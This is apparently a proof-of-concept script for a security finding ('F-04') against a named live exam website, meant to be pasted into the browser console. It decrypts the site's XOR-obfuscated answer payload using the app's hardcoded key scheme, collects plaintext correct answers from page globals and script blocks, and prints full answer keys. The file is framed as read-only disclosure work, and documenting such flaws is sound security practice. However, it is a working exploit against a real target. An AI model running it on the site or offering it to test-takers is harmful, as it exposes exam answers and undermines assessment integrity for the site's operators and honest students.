// poc_f04_exam_answers.js — F-04: Exam answer exposure (DISPLAY-ONLY, read-only)
//
// Target:  https://trithuc500.vercel.app/
// Finding:  F-04 — correct answers ship in the public bundle (both plaintext
//           `correctAnswers` and XOR-obfuscated `ENC_PAYLOAD`).
// Type:     DISPLAY ONLY. Reads the live DOM/global dataset and prints answers.
//           Does NOT modify state, does NOT contact ntfy/KV, does NOT submit.
//
// Usage: paste into DevTools Console on the target page.
// Output: a per-exam answer key table.

(() => {
    'use strict';

    // ---- 1. Decrypt the XOR-wrapped payload exactly as the app does. -------
    // Source: decryptV97EmbedPayload() — key = "TRUNG_SEC_2026_" + sig
    function decryptV97EmbedPayload(encB64, sig) {
        try {
            const rawBin = atob(encB64);
            const bytes = new Uint8Array(rawBin.length);
            for (let i = 0; i < rawBin.length; i++) bytes[i] = rawBin.charCodeAt(i);
            const keyStr = "TRUNG_SEC_2026_" + String(sig || '').trim();
            const outBytes = new Uint8Array(bytes.length);
            for (let i = 0; i < bytes.length; i++) {
                const k = keyStr.charCodeAt(i % keyStr.length);
                outBytes[i] = ((bytes[i] ^ k) - ((i * 7) % 256) + 256) % 256;
            }
            const utf8Str = new TextDecoder('utf-8').decode(outBytes);
            return JSON.parse(utf8Str);
        } catch (e) {
            try {
                const rawBin = atob(encB64);
                const bytes = new Uint8Array(rawBin.length);
                for (let i = 0; i < rawBin.length; i++) bytes[i] = rawBin.charCodeAt(i);
                const utf8Str = new TextDecoder('utf-8').decode(bytes);
                return JSON.parse(decodeURIComponent(escape(utf8Str)));
            } catch (e2) {
                return null;
            }
        }
    }

    // ---- 2. Collect exam records from every source the page exposes. ------
    const exams = [];

    // 2a. window.__INITIAL_EXAMS_DATA__ — the primary dataset.
    try {
        const raw = window.__INITIAL_EXAMS_DATA__;
        if (Array.isArray(raw)) {
            raw.forEach(e => {
                if (!e) return;
                const ca = e.correctAnswers || e.answers || null;
                exams.push({
                    source: '__INITIAL_EXAMS_DATA__',
                    id: e.id || '',
                    title: e.title || e.name || '',
                    hasPlainAnswers: !!ca,
                    answers: ca,
                    encPayload: e.ENC_PAYLOAD || e.encPayload || null,
                    sig: e.sig || e.signature || ''
                });
            });
        }
    } catch (e) { /* ignore */ }

    // 2b. DOM-embedded exam scripts (the per-lesson V4.3 payload blocks).
    const blocks = Array.from(document.querySelectorAll('script'))
        .map(s => s.textContent || '')
        .filter(t => t.includes('correctAnswers') || t.includes('ENC_PAYLOAD'));

    const domAnswers = [];
    blocks.forEach(text => {
        // plaintext correctAnswers JSON
        const mCa = text.match(/"correctAnswers"\s*:\s*(\{[\s\S]*?\})\s*,\s*"/);
        if (mCa) {
            try {
                domAnswers.push({ source: 'DOM script', kind: 'plain', answers: JSON.parse(mCa[1]) });
            } catch (e) { /* ignore */ }
        }
        // XOR payload
        const mEnc = text.match(/const\s+ENC_PAYLOAD\s*=\s*"([^"]+)"/);
        const mSig = text.match(/const\s+ENC_SIG\s*=\s*"?([^";\n]+)"?/);
        if (mEnc && mEnc[1] && mEnc[1] !== '{{ENC_PAYLOAD}}') {
            const dec = decryptV97EmbedPayload(mEnc[1], mSig ? mSig[1] : '');
            if (dec) domAnswers.push({ source: 'DOM script', kind: 'xor', answers: dec });
        }
    });

    // ---- 3. Report ---------------------------------------------------------
    const plainCount = exams.filter(e => e.hasPlainAnswers).length;
    console.log('=== F-04 Exam answer exposure (READ-ONLY) ===');
    console.log(`exams in __INITIAL_EXAMS_DATA__: ${exams.length}`);
    console.log(`exams with PLAINTEXT correctAnswers: ${plainCount}`);
    console.log(`DOM script blocks with answer data: ${blocks.length}`);
    console.log(`answer payloads recovered from DOM: ${domAnswers.length}`);

    if (plainCount > 0 || domAnswers.length > 0) {
        console.warn('[F-04] CONFIRMED: correct answers are present in client-shipped data.');
    }

    // Show a readable answer key for every exam that has one.
    const rows = [];
    exams.filter(e => e.hasPlainAnswers).forEach(e => {
        const ca = e.answers || {};
        rows.push({
            exam: (e.title || e.id).slice(0, 42),
            p1: Object.keys(ca.p1 || {}).length,
            p2: Object.keys(ca.p2 || {}).length,
            p3: Object.keys(ca.p3 || {}).length,
            source: e.source
        });
    });
    if (rows.length) console.table(rows);

    // Full answer key dump for the first exam that has one.
    const first = exams.find(e => e.hasPlainAnswers);
    if (first) {
        console.log(`\n--- Full answer key: ${first.title || first.id} ---`);
        console.log(JSON.stringify(first.answers, null, 1));
    }

    domAnswers.slice(0, 3).forEach((d, i) => {
        console.log(`\n--- DOM answer payload #${i + 1} (${d.kind}) ---`);
        console.log(JSON.stringify(d.answers).slice(0, 1200));
    });

    return {
        exams: exams.length,
        examsWithPlainAnswers: plainCount,
        domBlocks: blocks.length,
        domPayloads: domAnswers.length,
        verdict: (plainCount > 0 || domAnswers.length > 0) ? 'F-04 CONFIRMED (read-only)' : 'not observed',
        impact: 'Answers are client-side. Grading is client-side. A student can read the key before submitting.'
    };
})();
